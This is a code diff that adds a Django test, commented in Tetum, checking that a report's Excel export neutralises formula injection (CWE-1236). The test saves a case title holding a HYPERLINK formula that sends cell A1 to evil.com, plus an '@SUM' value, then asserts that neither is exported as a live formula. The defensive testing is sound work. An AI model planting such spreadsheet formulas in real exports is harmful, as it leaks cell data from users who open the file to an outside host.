@@ -120,6 +120,21 @@ class ExportTest(ReportBase):
 		self.assertIn('77112233', [str(c.value) for row in ws.iter_rows(min_row=2) for c in row])
 
 
+	def test_excel_la_iha_formula_injection(self):
+		# Seguransa (CWE-1236): dadus utilizador ne'ebé hahú ho = + - @ labele sai fórmula Excel
+		k = Kazu.objects.filter(munisipiu=self.dil).exclude(status__in=['DRAFT', 'CANCELED']).first()
+		k.titulu = '=HYPERLINK("http://evil.com?x="&A1,"klik")'
+		k.observasaun = '@SUM(1+1)'
+		k.save()
+		self.client.force_login(make_user(ADMIN, email='adm3@teste.tl'))
+		ws = load_workbook(BytesIO(self.client.get(reverse('report-export-excel'), {'munisipiu': self.dil.pk}).content)).active
+		for row in ws.iter_rows(min_row=2):
+			for c in row:
+				self.assertNotEqual(c.data_type, 'f', f'{c.coordinate} sai fórmula: {c.value!r}')
+				if isinstance(c.value, str) and 'HYPERLINK' in c.value:
+					self.assertTrue(c.value.startswith("'="), 'payload tenke neutraliza ho apóstrofu')
+
+
 class MapaTest(ReportBase):
 	def test_mapa_pin_no_hotspot(self):
 		self.client.force_login(self.analista)
